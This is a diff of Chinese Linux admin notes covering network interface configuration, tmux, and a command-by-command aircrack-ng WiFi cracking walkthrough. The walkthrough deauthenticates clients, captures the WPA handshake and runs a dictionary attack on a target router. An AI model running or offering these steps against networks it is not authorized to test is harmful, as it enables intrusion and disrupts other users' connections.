@@ -991,7 +991,7 @@ map R :source $MYVIMRC<CR>
 
 #### 命令
 
-##### cnetos
+##### centos
 
 - rpm: rpm 管理指令，可安装、升级、卸载、查询，安装可选择 url 和本地.rmp 文件
     - 选项
@@ -1084,25 +1084,78 @@ map R :source $MYVIMRC<CR>
 - 文件：一个文件占用一个 inode 和至少一个 block，inode 记录该文件的属性和权限，block 记录实际内容
 - 文件夹：一个文件夹占用一个 inode 和一个 block，inode 记录文件夹的属性和权限，block 记录文件夹中存在的文件名、文件 inode number 列表。（因此文件夹存在 r 权限即使不存在 x 权限也可查看其中的文件名列表），文件的文件名只与目录有关。
 
+## 网络的设置
+
+### 查看网络接口
+
+```
+ip addr
+```
+
+### 配置网络接口
+
+- 编辑 /etc/network/interfaces 文件
+- 为了避免潜在的路由冲突，确保在同一时间仅激活一个有线或无线网口会更稳妥。
+
+#### 设置 DHCP 动态分配 ip
+
+```
+# 有线网卡enp2s0配置
+auto enp2s0
+iface enp2s0 inet dhcp
+# 无线网卡wlp1s0配置
+auto wlp1s0
+iface wlp1s0 inet dhcp
+    wpa-ssid Your_SSID
+    wpa-psk Your_WiFi_Password
+```
+
+#### 设置静态 ip
+
+```
+# 有线网卡enp2s0配置
+auto enp2s0
+iface enp2s0 inet static
+    address 192.168.5.101
+    netmask 255.255.255.0
+    gateway 192.168.5.1
+    dns-nameservers 192.168.5.1
+# 无线网卡wlp1s0配置
+auto wlp1s0
+iface wlp1s0 inet static
+    address 192.168.5.102
+    netmask 255.255.255.0
+    gateway 192.168.5.1
+    dns-nameservers 192.168.5.1
+    wpa-ssid nobyrouter
+    wpa-psk  nobywifi
+```
+
+### 重启网络服务
+
+```
+sudo systemctl restart networking
+```
+
 ## 文件的传输
 
-    - `scp -r remote_username@remote_ip:remote_folder local_folder`
+- `scp -r remote_username@remote_ip:remote_folder local_folder`
 
 ## wifi 密码的破解
 
 - `sudo apt install aircrack-ng`
-    - 破解 WiFi 密码的软件
-- `sudo airmon-ng` 或 `ifconfig`
+    - 安装破解 WiFi 密码的软件
+- `ip addr`
     - 查看可用的无线网卡
 - `sudo airmon-ng start <无线网卡名>`
     - 开启网线网卡的监听，此时的网卡失去正常的网络连接能力
-- `sudo airmon-ng` 或 `ifconfig`
-    - 查看可用的无线网卡，开启监听后的无线网卡将会变为 `<无线网卡名>+mon`
+- `ip addr`
+    - 再次查看可用的无线网卡，开启监听后的无线网卡将会变为 `<无线网卡名>+mon`
 - `sudo airodump-ng <开启监听后的无线网卡名>
     - 查看 wifi 列表，获得目标 wifi 的 mac 地址和信道
 - `sudo airodump-ng -w <扫描结果保存的文件名> -c <信道> --bssid <目标wifi的mac地址> <开启监听后的无线网卡名>`
     - 开始捕获无线网络数据包，执行此命令后在新的窗口执行下条命令，本条命令在执行下条命令后再退出。退出后将会在<扫描结果保存的文件名>路径生成包含握手包的 cap 文件。此文件用来执行破解程序
-- `sudo aireplay-ng -0 0 -a <目标wifi的mac地址> -c <该wifi链接者的mac地址> <开启监听后的无线网卡名>` 或者 `sudo aireplay-ng -0 0 -a <目标wifi的mac地址> <开启监听后的无线网卡名>`
+- `sudo aireplay-ng -0 0 -a <目标wifi的mac地址> <开启监听后的无线网卡名>` 或者 `sudo aireplay-ng -0 0 -a <目标wifi的mac地址> -c <该wifi链接者的mac地址> <开启监听后的无线网卡名>`
     - 对目标设备发起攻击，执行后在上条命令的窗口查看，`][ Elapsed: 12 s ][ 2018-10-07 18:49` 后面多了 `][ WPA handshake: 22:47:DA:62:2A:F0`，此时关闭上条命令
 - `aircrack-ng -w 密码字典 <包含握手包的 cap 文件>`
     - 执行破解
@@ -1110,29 +1163,90 @@ map R :source $MYVIMRC<CR>
     - 关闭网线网卡的监听，关闭后的无线网卡才能正常连接 wifi
 
 ```sh
-su -
-
 sudo airmon-ng
 
 sudo airmon-ng start wlp1s0
 
-airodump-ng wlp1s0mon
+sudo airodump-ng wlp1s0mon
 
-airodump-ng -w cu -c 3 --bssid B0:AA:D2:4D:50:E3 wlp1s0mon
+sudo airodump-ng -w Y -c 12 --bssid BC:54:FC:2C:8E:54 wlp1s0mon
 
-aireplay-ng -0 2 -a B0:AA:D2:4D:50:E3 wlp1s0mon
+sudo aireplay-ng -0 0 -a BC:54:FC:2C:8E:54 wlp1s0mon
 
-aircrack-ng -w wpa-dictionary/common.txt ***.cap
+sudo aircrack-ng -w word.txt nobyrouter-02.cap
 
-airmon-ng stop wlp1s0mon
+sudo airmon-ng stop wlp1s0mon
 ```
 
-```shell
-sudo airport -s
+## Tmux
 
-sudo airport en1 sniff 4
+### 介绍
 
-sudo aireplay-ng -0 2 -a B0:AA:D2:4D:50:E3 en1
+- 会话与进程
+    - 命令行的典型使用方式是，打开一个终端窗口，在里面输入命令。用户与计算机的这种临时的交互，称为一次 " 会话 "（session） 。
+    - 会话的一个重要特点是，窗口与其中启动的进程是连在一起的。打开窗口，会话开始；关闭窗口，会话结束，会话内部的进程也会随之终止，不管有没有运行完。
+    - 一个典型的例子就是，SSH 登录远程计算机，打开一个远程窗口执行命令。这时，网络突然断线，再次登录的时候，是找不回上一次执行的命令的。因为上一次 SSH 会话已经终止了，里面的进程也随之消失了。
+    - 为了解决这个问题，会话与终端窗口可以 " 解绑 "：窗口关闭时，会话并不终止，而是继续运行，等到以后需要的时候，再让会话 " 绑定 " 其他窗口。
+- Tmux 的作用
+    - 它允许在单个终端窗口中，同时访问多个会话。这对于同时运行多个命令行程序很有用。
+    - 它可以在远程的服务器开启一个 Tmux 会话，在 Tmux 会话中运行的程序不受本地终端窗口的退出而终端。之后可重新开启的终端窗口 " 接入 " 已经存在的会话。使得之前的工作可以继续。使得本地终端和远程的服务器进程 " 解绑 "
+    - 它允许每个会话有多个连接窗口，因此可以多人实时共享会话。
+    - 它还支持窗口任意的垂直和水平拆分成多个面板。
+- Tmux 的组成及包含关系：会话>窗口>面板
 
-sudo aircrack-ng -w ~/wifi/wpa-dictionary/mydict.txt /tmp/***.cap
-```
+### 安装
+
+- `sudo apt-get install tmux`
+    - 在远程的服务器键入安装命令
+
+### 使用
+
+- `ctrl+b`
+    - tmux 前缀键，开启 tmux 快捷键识别（避免与系统快捷键冲突）
+
+#### 会话
+
+- `tmux`
+    - 开启一个会话，并自动启动一个窗口。底部有一个状态栏。状态栏的左侧是窗口信息（编号和名称），右侧是系统信息。
+- `tmux new -s <session-name>`
+    - 自定义名称开启一个会话
+- `ctrl+b d`
+    - 退出 tmux 并保留会话（直接关闭终端无需任何操作也会默认保留会话）
+- `ctrl+d`
+    - 退出 tmux 不保留会话
+- `tmux ls`
+    - tmux 外查看所有会话，
+- `tmux attach -t 0`
+    - 接入会话 0
+- `tmux a`
+    - 接入之前的会话
+- `tmux kill-session -t 0`
+    - 终止会话
+- `tmux switch -t 0`
+    - 切换会话
+- `ctrl+b $` `tmux rename-session -t 0 <new-name>`
+    - tmux 中重命名会话，tmux 外重命名会话
+
+#### 窗口
+
+- `ctrl+b c`
+    - 在当前会话中开启一个新的窗口
+- `ctrl+b num`
+    - 切换窗口
+- `ctrl+b &`
+    - 关闭当前窗口
+- `ctrl+b w`
+    - 查看所有的会话与窗口
+
+#### 面板
+
+- `ctrl+b %`
+    - 右方创建一个新的面板
+- `ctrl+b "`
+    - 下方创建一个新的面板
+- `ctrl+b ↑↓←→`
+    - 切换面板
+- `ctrl+b q num`
+    - 切换面板
+- `ctrl+b x`
+    - 关闭面板
